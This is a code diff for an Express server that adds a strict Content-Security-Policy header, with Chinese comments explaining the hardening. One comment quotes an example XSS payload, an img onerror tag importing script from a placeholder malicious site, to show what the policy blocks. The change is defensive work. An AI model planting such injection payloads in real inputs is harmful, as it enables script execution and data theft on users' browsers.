@@ -106,10 +106,13 @@ const guard = (req, write) => {
   if (o) return originOk(o) ? null : `来源 ${String(o).slice(0, 80)} 不是本页面，已拒绝`;
   return tokenOk(req.headers['x-tmtn-token']) ? null : '缺少访问令牌（x-tmtn-token），已拒绝';
 };
+// CSP：只运行本站自己的 .js 文件。代币名 / 代号里藏的 <img onerror=import('//恶意网站/x.js')> 之类，就算哪里漏了转义也执行不了，
+// 也连不到别的网站（connect-src 只许本机）；图片只走本机 /api/img 代理，不让陌生图床拿到你的 IP
+const csp = (req) => { const h = String(req.headers.host || '').replace(/[^\w.:[\]-]/g, ''); return `default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self' data:; connect-src 'self' ws://${h} wss://${h}; object-src 'none'; base-uri 'none'; form-action 'self'; frame-ancestors 'none'`; };
 app.use((req, res, next) => {
   const e = guard(req, !['GET', 'HEAD', 'OPTIONS'].includes(req.method));
   if (e) { console.warn(`[security] ${req.method} ${req.path}：${e}`); return res.status(403).json({ error: e }); }
-  res.set({ 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'Content-Security-Policy': "frame-ancestors 'none'" });   // 页面不许被别的网站嵌进 iframe（防点击劫持）
+  res.set({ 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'Content-Security-Policy': csp(req) });   // 页面不许被别的网站嵌进 iframe（防点击劫持）
   next();
 });
 app.use(express.json());
